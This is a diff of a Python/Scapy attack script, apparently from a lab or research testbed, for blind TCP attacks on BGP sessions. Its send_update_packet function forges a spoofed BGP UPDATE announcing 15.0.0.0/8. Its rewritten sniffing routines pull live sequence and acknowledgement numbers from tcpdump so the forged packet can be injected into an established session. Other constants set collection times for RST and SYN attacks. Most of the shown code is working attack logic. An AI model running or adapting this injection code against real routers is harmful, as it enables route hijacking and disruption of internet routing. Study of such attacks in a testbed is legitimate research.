@@ -18,7 +18,7 @@ SOURCE_ADDRESS = '9.0.1.2'
 DESTINATION_ADDRESS = '9.0.1.1'
 BLIND_RST_ATTACK_COLLECT_TIME = 15 * 2 # <keepalive> * 2
 BLIND_SYN_ATTACK_COLLECT_TIME = 15 * 2 # <keepalive> * 2
-BLIND_DATA_ATTACK_COLLECT_TIME = 15 * 4 # <keepalive> * 2
+BLIND_DATA_ATTACK_COLLECT_TIME = 45 + 15 * 2 # <hold-timer> + <keep-alive> * 2
 
 
 def send_rst_packet(iface, srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, seqNum, ackNum, win):
@@ -81,22 +81,22 @@ def send_update_packet(iface, srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, se
 
 	paORIGIN = BGPPathAttribute(flags = 0x40, type = 1, attr_len = 1, value = '\x00')
 
-	# PathAttribute [AS -SEQ (2)][ ASN# (1)][ ASN (300)]
-	#paAS = BGPPathAttribute(flags = 0x40, type = 2, attr_len = 4, value = '\x02\x01\x00\x03')
-	# PathAttribute [AS -SEQ (2)][ ASN# (1)][ ASN (300)]
+	# PathAttribute [AS-SEQ (2)][ ASN# (1)][ ASN (300)]
 	paAS = CustomBGPPathAttribute(flags = 0x50, type = 2, attr_len = 6, value = '\x02\x01\x00\x00\x00\x03')
 	
 	# Path Next Hop [IP (9.0.1.2)]
 	paNEXTHOP = BGPPathAttribute(flags = 0x40 , type = 3, attr_len = 4, value = '\x09\x00\x01\x02')
 
 	# Multiple Exit Discriminator [0000]
-	paMED= BGPPathAttribute(flags = 0x80 , type = 4, attr_len = 4, value = '\x00\x00\x00\x00')
+	#paMED= BGPPathAttribute(flags = 0x80 , type = 4, attr_len = 4, value = '\x00\x00\x00\x00')
 
-	paBGPU = BGPUpdate(tp_len = 28, total_path = [paORIGIN , paAS , paNEXTHOP, paMED], nlri = [(8 , '15.0.0.0')])
-
+	#paBGPU = BGPUpdate(tp_len = 28, total_path = [paORIGIN , paAS , paNEXTHOP, paMED], nlri = [(8 , '15.0.0.0')])
+	paBGPU = BGPUpdate(tp_len = 21, total_path = [paORIGIN , paAS , paNEXTHOP], nlri = [(8 , '15.0.0.0')])
+	
+	# BGPHeader(len = 53, type = 2)/\
 	spoofed_packet = IP(dst = dstIP, src = srcIP, ttl = 255)/\
 		TCP(dport = dstPort, sport = srcPort, flags = "PA", seq = seqNum, ack = ackNum, window = win)/\
-		BGPHeader(len = 53, type = 2)/\
+		BGPHeader(len = 46, type = 2)/\
 		paBGPU
 
 	frame = Ether(src=srcMac, dst=dstMac)/spoofed_packet
@@ -106,17 +106,8 @@ def send_update_packet(iface, srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, se
 	sendp(frame, iface=iface)
 
 
-def extract_address_port(value):
-	values = value.split('.')
-
-	address = values[0] + '.' + values[1] + '.' + values[2] + '.' + values[3]
-
-	port = values[4]
-
-	return address, port
-
-
 def extract_ports_and_numbers(row, srcIP, dstIP):
+	print row
 	srcPort, dstPort, seqNum, ackNum, win = None, None, None, None, None
 
 	values = row.split(' ')
@@ -127,7 +118,12 @@ def extract_ports_and_numbers(row, srcIP, dstIP):
 	b = values[4].replace(':', '').split('.')
 	dstAddr = '.'.join(b[0:4])
 
-	if srcAddr == srcIP and dstAddr == dstIP and values[7] == 'seq':
+	l = values[20].replace(':', '')
+	print l
+	print values[7]
+
+	#if srcAddr == srcIP and dstAddr == dstIP and 
+	if values[7] == 'seq' and l == '0':
 		srcPort = a[4]
 		dstPort = b[4]
 
@@ -142,83 +138,170 @@ def extract_ports_and_numbers(row, srcIP, dstIP):
 
 		win = values[12].replace(',', '')
 
+	print
+	print 'srcAddr, dstAddr'
+	print srcAddr, dstAddr
+	print 'srcPort, dstPort, seqNum, ackNum, win'
+	print srcPort, dstPort, seqNum, ackNum, win
+	print
+
 	return srcPort, dstPort, seqNum, ackNum, win
 
 
-def retrieve_atk1_mac_address(iface):
-	p = Popen(('ifconfig'), stdout=PIPE)
-
-	for row in iter(p.stdout.readline, b''):
-		if iface in row:
-			values = row.split(' ')
-
-			p.kill()
-
-			return values[5]
-
-	p.kill()
-
-	return None
-
-
-def extract_r2_mac_addresses(row, ip_address):
+def packet_is_ACK(row):
 	values = row.split(' ')
 
-	if ip_address in values[9]:
-		return values[1].replace(',','')
-
-	if ip_address in values[11]:
-		return values[3].replace(',','')
-
-	return None
+	if values[7] == 'ack' and values[18].replace('\n', '') == '0':
+		return True
+	else:
+		return False
 
 
-def retrieve_r2_mac_address(iface, ip_address):
-	p = Popen(('sudo', 'tcpdump', '-i', iface, '-lnSe'), stdout=PIPE)
+def analyze_first_row(row):
+	print 'processing first row'
+	print row
 
-	r2_mac_address = None
+	values = row.split(' ')
 
-	for row in iter(p.stdout.readline, b''):
-		r2_mac_address = extract_r2_mac_addresses(row, ip_address)
+	for i, v in enumerate(values):
+		print '[', i, ']', v
 
-		if r2_mac_address != None:
-			p.kill()
+	sys.stdout.flush()
 
-			break
+	# 9.0.1.1.179
+	# extract address and port
+	a = values[2].split('.')
+	sa = '.'.join(a[0:4])
+	sp = a[4]
 
-	return r2_mac_address
+	b = values[4].split('.')
+	da = '.'.join(b[0:4])
+	dp = b[4].replace(':', '')
+
+	a = values[10].replace(',', '')
+	s = values[8].replace(',', '').split(':')[1]
+
+	w = values[12].replace(',', '')
+
+	return sa, da, sp, dp, a, s, w
+
+
+def analyze_second_row(row):
+	print 'processing second row'
+	print row
+
+	values = row.split(' ')
+
+	for i, v in enumerate(values):
+		print '[', i, ']', v
+
+	sys.stdout.flush()
+
+	if values[7] == 'ack':
+		# this is an ACK
+		return True, True, True, True, True, True, True
+	else:
+		return analyze_first_row(row)
+
+
+def analyze_third_row(row):
+	print 'processing third row'
+	print row
+
+	values = row.split(' ')
+
+	"""
+	for i, v in enumerate(values):
+		print '[', i, ']', v
+	"""
+
+	sys.stdout.flush()
+
+	return True, True, True, True, True, True, True
+
+
+def choose_ports_and_numbers(srcIP, sa, da, sp, dp, a, s, w):
+	if sa == srcIP:
+		return sp, dp, a, s, w
+	else: 
+		# ports and numbers are switched
+		# as the attack BGP UPDATE is sent in the opposite direction
+		return dp, sp, s, a, w
 
 
 def retrieve_ports_and_numbers(iface, srcIP, dstIP):
-	p = Popen(('sudo', 'tcpdump', '-i', iface, '-lnS'), stdout=PIPE)
+	# TODO cercare un ack
+	# in base a src e a dst prelevi AN e SN
+	# e li usi per l'UPDATE BGP
+	p = Popen(('sudo', 'tcpdump', '-i', iface, '-lnS', 'not arp'), stdout=PIPE)
 
 	srcPort, dstPort, seqNum, ackNum, win = None, None, None, None, None
 
+	# find a TCP ACK
+	# process following 3 packets to get proper AN & SN
+	# first
+	# second
+	# third
+
+	phase = 0
+	row1 = None
+	row2 = None
+	row3 = None
+
+	rows = list()
+
 	for row in iter(p.stdout.readline, b''):
-		srcPort, dstPort, seqNum, ackNum, win = extract_ports_and_numbers(row, srcIP, dstIP)
+		values = row.split(' ')
 
-		if srcPort and dstPort and seqNum and ackNum and win:
-			p.kill()
+		if phase == 1:
+			print row
+			rows.append(row)
 
-			return srcPort, dstPort, seqNum, ackNum, win
+			if packet_is_ACK(row):
+				break
 
-		srcPort, dstPort, seqNum, ackNum, win = None, None, None, None, None
+		if phase == 0:
+			if packet_is_ACK(row):
+				phase = 1
+	
+	p.kill()
+
+	row1 = rows[-3]
+	row2 = rows[-2]
+	row3 = rows[-1]
+
+	print row1
+	print row2
+	print row3
+
+	sa1, da1, sp1, dp1, a1, s1, w1 = analyze_first_row(row1)
+
+	sa2, da2, sp2, dp2, a2, s2, w2 = analyze_second_row(row2)
+	if sa2 == True:
+		print 'case 2'
+		print sa1, da1, sp1, dp1, a1, s1, w1
+
+		return choose_ports_and_numbers(srcIP, sa1, da1, sp1, dp1, a1, s1, w1)
+	
+	sa3, da3, sp3, dp3, a3, s3, w3 = analyze_third_row(row3)
+	if sa3 == True:
+		print 'case 3'
+		print sa2, da2, sp2, dp2, a2, s2, w2
+
+		return choose_ports_and_numbers(srcIP, sa2, da2, sp2, dp2, a2, s2, w2)
 
 
 def main():
 	choice = int(sys.argv[1])
-	parent_pid = int(sys.argv[2])
 	assert choice >= 1
 	assert choice <= 3
 
-	src_mac_address = retrieve_atk1_mac_address('atk1-eth0')
-	#src_mac_address = retrieve_atk1_mac_address('atk1-eth1')
-	assert src_mac_address is not None
+	parent_pid = int(sys.argv[2])
+
+	src_mac_address = sys.argv[3]
 	print '\natk1 source MAC address', src_mac_address
 
-	dst_mac_address = retrieve_r2_mac_address('atk1-eth0', '9.0.0.2')
-	#dst_mac_address = retrieve_r2_mac_address('atk1-eth1', DESTINATION_ADDRESS)
-	assert dst_mac_address is not None
+	dst_mac_address = sys.argv[4]
 	print 'R2 destination MAC address', dst_mac_address
 	print
 
@@ -255,6 +338,9 @@ def main():
 	log2('packets collection', collect_time, 'red')
 	log('Packets collected', 'red')
 	log('Check pcap capture files', 'red')
+
+
+	# TODO controlla se l'attacco ha effetto
 
 
 if __name__ == "__main__":
